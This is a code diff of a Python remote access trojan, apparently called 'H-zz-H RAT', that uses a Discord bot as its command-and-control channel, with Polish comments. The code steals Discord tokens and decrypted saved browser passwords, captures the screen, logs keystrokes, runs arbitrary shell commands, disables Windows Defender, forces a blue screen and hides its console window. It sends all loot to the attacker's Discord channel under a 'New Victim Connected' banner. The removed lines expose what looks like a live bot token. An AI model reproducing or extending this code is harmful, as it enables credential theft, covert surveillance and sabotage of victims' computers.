@@ -1,68 +1,40 @@
-import discord
-from discord.ext import commands
 import os
 import sys
-import subprocess
-import psutil
-import pyautogui
-import ctypes
-from pynput import keyboard as kb
-import asyncio
-import time
-import socket
-import threading
 import getpass
 import platform
-import cv2
-from datetime import datetime
+import subprocess
+import requests
+import ctypes
+from pynput import keyboard as kb
+import threading
+import sqlite3
 import base64
 import win32crypt
-import sqlite3
-import re
-import requests
+import time
 import json
-import winreg as reg
-from urllib.parse import urlparse
+import re
+import shutil
+import asyncio
+import discord
+from discord.ext import commands
+from Cryptodome.Cipher import AES
 from PIL import ImageGrab
+import psutil
+import pyautogui
+import cv2
 import numpy as np
 import sounddevice as sd
 import wave
 import browser_cookie3
-from Cryptodome.Cipher import AES
 from colorama import Fore, init
-
-pip install --upgrade pip
 
 init()
 
-# Bot token
-HzzH = "MTM3ODE4MjU1ODY4ODQ4MTQ0MQ.GDewIa.jT7xSvILybvCh44VIZNPLM1i9ECuZLIWQV1pyc"
-
-# Intents and bot setup
-intents = discord.Intents.default()
-intents.message_content = True
-intents.guild_messages = True
-
-bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
-
-# Global variables
-key_log = []
-keylog_listener = None
-reverse_mouse = False
-cpu_stress_running = False
-shaking_task = None
-input_blocked = False
-temp_folder = os.getenv("TEMP")
-hwid_list = {}
-current_directory = os.getcwd()
-hzzh_path = os.path.join(temp_folder, "rat_client.exe")
-hzzh_path1 = os.path.join(temp_folder, "rat_client_temp.exe")
-
-# Check admin rights
+# Funkcja sprawdzania administratora
 def is_admin():
     return ctypes.windll.shell32.IsUserAnAdmin() != 0
 
-# Get system info
+# Informacje o systemie
 def get_system_info():
     pc_name = platform.node()
     ip_address = requests.get("https://api.ipify.org").text 
@@ -87,63 +59,7 @@ def get_system_info():
         "Disk Info": disk_usage
     }
 
-# Create session channel for victim
-async def create_session_channel(guild, name):
-    existing = discord.utils.get(guild.channels, name=name.lower())
-    if existing:
-        await existing.delete()
-    channel = await guild.create_text_channel(name)
-    return channel
-
-# On ready
-@bot.event
-async def on_ready():
-    print(f"[+] Bot {bot.user} is online.")
-
-# !information - Show system info
-@bot.command()
-async def information(ctx):
-    info = get_system_info()
-    embed = discord.Embed(title="🖥️ System Information", color=discord.Color.blue())
-    for key, value in info.items():
-        embed.add_field(name=key, value=value, inline=False)
-    await ctx.send(embed=embed)
-
-# !tokens - Steal Discord tokens
-@bot.command()
-async def tokens(ctx):
-    tokens = []
-    local = os.getenv("LOCALAPPDATA")
-    roaming = os.getenv("APPDATA")
-    paths = {
-        'Discord': os.path.join(roaming, 'Discord', 'Local Storage', 'leveldb'),
-        'Chrome': os.path.join(local, 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies')
-    }
-    for name, path in paths.items():
-        if not os.path.exists(path):
-            continue
-        for file in os.listdir(path):
-            if file.endswith('.log') or file.endswith('.ldb'):
-                try:
-                    with open(os.path.join(path, file), errors='ignore') as f:
-                        lines = f.readlines()
-                        for line in lines:
-                            match = re.findall(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}", line)
-                            if match:
-                                tokens.extend(match)
-                except:
-                    pass
-    if tokens:
-        unique_tokens = list(set(tokens))
-        embed = discord.Embed(title="🔑 Found Discord Tokens", color=discord.Color.green())
-        for token in unique_tokens[:25]:
-            embed.add_field(name="Token", value=f"``{token}``", inline=False)
-        await ctx.send(embed=embed)
-    else:
-        embed = discord.Embed(title="❌ No Tokens Found", description="Could not find any tokens.", color=discord.Color.red())
-        await ctx.send(embed=embed)
-
-# !passwords - Steal saved passwords from browsers
+# Kradzież haseł z przeglądarki
 BROWSERS = {
     "chrome": {
         "path": os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data'),
@@ -162,7 +78,6 @@ BROWSERS = {
     }
 }
 
-# Decrypt password logic
 def get_master_key(browser_path):
     try:
         local_state_path = os.path.join(browser_path, "Local State")
@@ -200,7 +115,7 @@ def get_browser_passwords(browser_name, data):
         db_path = os.path.join(browser_path, profile, "Login Data")
         if not os.path.exists(db_path):
             continue
-        temp_db = os.path.join(temp_folder, f"{browser_name}_{profile}_Login_Data.db")
+        temp_db = os.path.join(os.getenv("TEMP"), f"{browser_name}_{profile}_Login_Data.db")
         shutil.copy2(db_path, temp_db)
 
         conn = sqlite3.connect(temp_db)
@@ -230,13 +145,81 @@ def get_browser_passwords(browser_name, data):
         os.remove(temp_db)
     return passwords
 
+# Token bota (musisz go zmienić!)
+BOT_TOKEN = "TWOJ_TOKEN_BOTA_TUTAJ"
+
+# Intents i bot Discord (w tle)
+intents = discord.Intents.default()
+intents.message_content = True
+intents.guild_messages = True
+
+bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
+
+# Rejestracja kanału dla tej ofiary
+async def create_session_channel(guild):
+    pc_name = platform.node().replace("\\", "").replace("/", "")
+    pc_name = re.sub(r'[^\w]', '', pc_name)
+    existing = discord.utils.get(guild.channels, name=pc_name.lower())
+    if existing:
+        await existing.delete()
+    channel = await guild.create_text_channel(pc_name.lower())
+    info = get_system_info()
+    embed = discord.Embed(title="[H-zz-H] New Victim Connected",
+                          description=f"**PC:** {info['PC Name']}\n"
+                                       f"**IP:** {info['IP Address']}\n"
+                                       f"**Geo:** {info['Geolocation']}\n"
+                                       f"**OS:** {info['System Version']}",
+                          color=discord.Color.green())
+    await channel.send(embed=embed)
+    print(f"[+] Session channel '{pc_name}' created.")
+
+@bot.event
+async def on_ready():
+    print(f"[+] Bot {bot.user} is running in the background.")
+    if bot.guilds:
+        await create_session_channel(bot.guilds[0])
+
+# Komenda !tokens – kradzież tokenów Discord
+@bot.command()
+async def tokens(ctx):
+    tokens = []
+    local = os.getenv("LOCALAPPDATA")
+    roaming = os.getenv("APPDATA")
+    paths = {
+        'Discord': os.path.join(roaming, 'Discord', 'Local Storage', 'leveldb'),
+        'Chrome': os.path.join(local, 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies')
+    }
+    for name, path in paths.items():
+        if not os.path.exists(path):
+            continue
+        for file in os.listdir(path):
+            if file.endswith('.log') or file.endswith('.ldb'):
+                try:
+                    with open(os.path.join(path, file), errors='ignore') as f:
+                        lines = f.readlines()
+                        for line in lines:
+                            match = re.findall(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}", line)
+                            if match:
+                                tokens.extend(match)
+                except Exception as e:
+                    pass
+    if tokens:
+        unique_tokens = list(set(tokens))
+        embed = discord.Embed(title="🔑 Found Tokens", color=discord.Color.red())
+        for token in unique_tokens[:25]:
+            embed.add_field(name="Token", value=f"``{token}``", inline=False)
+        await ctx.send(embed=embed)
+    else:
+        embed = discord.Embed(title="❌ No Tokens Found", description="Could not find any tokens.", color=discord.Color.dark_red())
+        await ctx.send(embed=embed)
+
+# Komenda !passwords – kradzież haseł z przeglądarek
 @bot.command()
 async def passwords(ctx):
     all_passwords = []
     for browser_name, data in BROWSERS.items():
         passwords = get_browser_passwords(browser_name, data)
         all_passwords.extend(passwords)
-
     if all_passwords:
         output = "**🔐 Saved Passwords:**\n\n"
         for entry in all_passwords:
@@ -251,16 +234,16 @@ async def passwords(ctx):
     else:
         await ctx.send("[+] No passwords found.")
 
-# !screen - Take screenshot
+# Komenda !screen – zrzut ekranu
 @bot.command()
 async def screen(ctx):
-    screenshot_path = os.path.join(temp_folder, "screenshot.png")
+    screenshot_path = os.path.join(os.getenv("TEMP"), "screenshot.png")
     img = ImageGrab.grab()
     img.save(screenshot_path)
     await ctx.send(file=discord.File(screenshot_path))
     os.remove(screenshot_path)
 
-# !exec - Execute command
+# Komenda !exec – wykonaj komendę CMD
 @bot.command()
 async def exec(ctx, *, cmd: str):
     proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -274,85 +257,92 @@ async def exec(ctx, *, cmd: str):
     else:
         await ctx.send(f"```\n{result_str}\n```")
 
-# !geolocation - Get geographic location
-@bot.command()
-async def geolocation(ctx):
-    response = requests.get("https://ipinfo.io/json").json() 
-    await ctx.send(f"📍 Location: {response}")
-
-# !bsod - Trigger Blue Screen Of Death
+# Komenda !bsod – wywołanie BSOD
 @bot.command()
 async def bsod(ctx):
     if is_admin():
-        try:
-            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
-            ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
-            await ctx.send("BSOD executed!")
-        except Exception as e:
-            await ctx.send(f"Error: {e}")
+        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
+        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
+        await ctx.send("💥 BSOD executed!")
     else:
-        await ctx.send("Admin privileges required.")
+        await ctx.send("⚠️ Admin rights required!")
 
-# !disabledefender - Disable Windows Defender
+# Komenda !disabledefender – wyłączenie Windows Defender
 @bot.command()
 async def disabledefender(ctx):
     if is_admin():
         os.system("sc stop WinDefend >nul & sc config WinDefend start=disabled >nul")
-        await ctx.send("Windows Defender disabled.")
+        await ctx.send("🛡️ Windows Defender disabled!")
     else:
-        await ctx.send("Admin privileges required.")
+        await ctx.send("⚠️ Admin privileges required!")
 
-# !reboot - Restart PC
-@bot.command()
-async def reboot(ctx):
-    await ctx.send("Restarting system...")
-    os.system("shutdown /r /t 0")
+# Komenda !keylog_start / stop
+key_log = []
+keylog_listener = None
 
-# !minimize - Simulate Win+D
-@bot.command()
-async def minimize(ctx):
-    pyautogui.hotkey('win', 'd')
-    await ctx.send("All windows minimized.")
+def on_press(key):
+    global key_log
+    key_log.append(str(key))
 
-# !steam - Get Steam account info
 @bot.command()
-async def steam(ctx):
-    steam_path = os.path.join(os.getenv("ProgramFiles(x86)"), "Steam", "config", "loginusers.vdf")
-    if os.path.exists(steam_path):
-        with open(steam_path, "r") as f:
-            content = f.read()
-        await ctx.send(f"🦺 Steam Account:\n```\n{content[:1900]}\n```")
+async def keylog_start(ctx):
+    global keylog_listener
+    if keylog_listener is None:
+        keylog_listener = kb.Listener(on_press=on_press)
+        keylog_listener.start()
+        await ctx.send("⌨️ Keylogger started!")
+
+@bot.command()
+async def keylog_stop(ctx):
+    global keylog_listener, key_log
+    if keylog_listener and keylog_listener.is_alive():
+        keylog_listener.stop()
+        keylog_listener = None
+        await ctx.send("🛑 Keylogger stopped.")
+        with open("keylog.txt", "w") as f:
+            f.write("\n".join(key_log))
+        await ctx.send(file=discord.File("keylog.txt"))
+        os.remove("keylog.txt")
+        key_log.clear()
     else:
-        await ctx.send("[!] Steam not found.")
+        await ctx.send("🛑 Keylogger is not running.")
 
-# !roblox - Get Roblox cookies
-@bot.command()
-async def roblox(ctx):
-    cookies_path = os.path.join(os.getenv("LOCALAPPDATA"), "Roblox", "logs", "http.log")
-    if os.path.exists(cookies_path):
-        with open(cookies_path, "r") as f:
-            data = f.read()
-        await ctx.send(f"🦺 Roblox Cookies:\n```\n{data[:1900]}\n```")
-    else:
-        await ctx.send("[!] No Roblox logs found.")
-
-# !help - Command list
+# Komenda !help – lista komend
 @bot.command()
 async def help(ctx):
     embed = discord.Embed(title="📚 Help Menu", color=discord.Color.blue())
-    embed.add_field(name="!information", value="Get system information", inline=False)
-    embed.add_field(name="!passwords", value="Steal saved browser passwords", inline=False)
     embed.add_field(name="!tokens", value="Steal Discord tokens", inline=False)
+    embed.add_field(name="!passwords", value="Steal saved browser passwords", inline=False)
     embed.add_field(name="!screen", value="Take a screenshot", inline=False)
-    embed.add_field(name="!exec [cmd]", value="Execute CMD command", inline=False)
-    embed.add_field(name="!geolocation", value="Get IP geolocation", inline=False)
-    embed.add_field(name="!bsod", value="Trigger BSOD", inline=False)
+    embed.add_field(name="!exec", value="Run CMD command", inline=False)
     embed.add_field(name="!disabledefender", value="Disable Windows Defender", inline=False)
+    embed.add_field(name="!bsod", value="Trigger Blue Screen Of Death", inline=False)
+    embed.add_field(name="!keylog_start/stop", value="Start/stop keylogger", inline=False)
     embed.add_field(name="!reboot", value="Reboot target PC", inline=False)
-    embed.add_field(name="!minimize", value="Simulate Win+D", inline=False)
-    embed.add_field(name="!steam", value="Get Steam account info", inline=False)
-    embed.add_field(name="!roblox", value="Get Roblox cookies", inline=False)
+    embed.add_field(name="!geolocation", value="Get IP location", inline=False)
     await ctx.send(embed=embed)
 
-# Run the bot
-bot.run(HzzH)
+# Asynchroniczny runner bota
+def run_bot():
+    bot.run(BOT_TOKEN)
+
+# Symulacja działania RAT-a
+def rat_main():
+    print("[+] H-zz-H RAT Client Running...")
+    while True:
+        time.sleep(5)
+
+# Główna funkcja – uruchamia wszystko
+if __name__ == "__main__":
+    # Ukrycie okna konsoli (opcjonalne)
+    if sys.platform == "win32":
+        import ctypes
+        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
+    # Uruchomienie bota w osobnym wątku
+    bot_thread = threading.Thread(target=run_bot)
+    bot_thread.daemon = True
+    bot_thread.start()
+
+    # Główne działanie RAT-a
+    rat_main()
